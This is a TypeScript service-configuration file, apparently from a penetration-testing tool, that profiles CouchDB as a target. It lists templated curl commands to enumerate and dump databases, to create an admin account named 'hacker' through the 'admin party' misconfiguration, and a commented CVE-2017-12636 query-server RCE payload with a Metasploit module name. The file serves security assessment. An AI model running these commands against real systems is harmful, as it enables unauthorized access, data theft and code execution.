import { ServiceConfig } from './types';

/**
 * CouchDB Configuration
 * 
 * Apache CouchDB document database.
 * Known for admin party misconfiguration.
 */
export const couchdbConfig: ServiceConfig = {
  id: 'couchdb',
  name: 'CouchDB',
  category: 'databases',
  description: 'Apache CouchDB document-oriented database. Known for "admin party" misconfiguration where all users are admins.',

  triggers: [
    { ports: [5984], services: ['http', 'couchdb'] },
    { ports: [6984], services: ['https', 'couchdb'] },
    { bannerPatterns: ['CouchDB', '"couchdb":"Welcome"'] },
  ],

  defaultPriority: 'HIGH',
  riskScore: 8,
  highValuePorts: [5984],
  highValueReason: 'CouchDB often runs without authentication or with default credentials',

  techniques: [
    {
      id: 'couchdb-info',
      name: 'Information Gathering',
      description: 'Check for admin party mode',
      tools: ['curl', 'nmap'],
      commands: [
        'curl http://{ip}:5984',
        'curl http://{ip}:5984/_all_dbs',
        'curl http://{ip}:5984/_utils/',
      ],
      priority: 'HIGH',
    },
    {
      id: 'couchdb-admin-party',
      name: 'Admin Party Check',
      description: 'Check if unauthenticated admin access',
      tools: ['curl'],
      commands: [
        'curl -X PUT http://{ip}:5984/_node/_local/_config/admins/hacker -d \'"password"\'',
        '# If successful, you just created an admin account',
      ],
      priority: 'CRITICAL',
    },
    {
      id: 'couchdb-enum-dbs',
      name: 'Database Enumeration',
      description: 'List all databases',
      tools: ['curl'],
      commands: [
        'curl http://{ip}:5984/_all_dbs',
        'curl http://{ip}:5984/database_name/_all_docs',
      ],
      priority: 'HIGH',
    },
    {
      id: 'couchdb-dump',
      name: 'Data Dump',
      description: 'Export database contents',
      tools: ['curl'],
      commands: [
        'curl http://{ip}:5984/db_name/_all_docs?include_docs=true',
      ],
      priority: 'HIGH',
    },
    {
      id: 'couchdb-rce',
      name: 'Remote Code Execution',
      description: 'RCE via Erlang query server',
      mitreId: 'T1059',
      tools: ['curl', 'metasploit'],
      commands: [
        '# CVE-2017-12636 - RCE via query server',
        '# curl -X PUT http://{ip}:5984/_config/query_servers/cmd -d \'"whoami"\'',
        '# Metasploit: exploit/multi/http/apache_couchdb_cmd_exec',
      ],
      priority: 'CRITICAL',
      cves: ['CVE-2017-12636'],
    },
  ],

  references: [
    { type: 'cwe', id: 'CWE-306', description: 'Missing Authentication' },
    { type: 'cve', id: 'CVE-2017-12635', description: 'CouchDB Admin Party' },
    { type: 'cve', id: 'CVE-2017-12636', description: 'CouchDB RCE' },
  ],

  uiConfig: {
    icon: 'database',
    color: '#e53935',
    tags: ['CouchDB', 'NoSQL', 'Database', 'JSON'],
  },
};
